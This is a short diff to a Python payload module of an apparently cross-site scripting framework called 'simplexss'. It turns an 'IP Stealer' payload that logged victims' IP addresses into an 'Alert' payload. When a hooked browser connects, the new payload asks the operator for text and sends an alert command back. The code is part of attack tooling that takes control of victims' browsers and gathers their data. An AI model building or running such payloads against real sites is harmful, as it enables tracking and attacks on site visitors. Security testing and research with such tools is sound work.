@@ -8,19 +8,24 @@ from simplexss.api import (
 
 class Payload(BasePayload):
     AUTHOR = 'crazyproger1'
-    DESCRIPTION = 'Steals IP.'
-    NAME = 'IP Stealer'
+    DESCRIPTION = 'Alerts your message when connection established.'
+    NAME = 'Alert'
     VERSION = '0.0.1'
-
-    async def on_ip(self, client: BaseClient, event: BaseEvent):
-        await self.io.print(f'IP: {event.data.get("ip", "unknown")}')
 
     async def on_connection(self, client: BaseClient, event: BaseEvent):
         await self.io.print(f'Connection established: {client.origin}')
 
+        text = await self.io.input('Text')
+
+        return {
+            'name': 'alert',
+            'data': {
+                'text': text
+            }
+        }
+
     def bind_endpoints(self):
         self.transport.bind_endpoint('connection', self.on_connection)
-        self.transport.bind_endpoint('ip', self.on_ip)
 
     @property
     def payload(self) -> str:
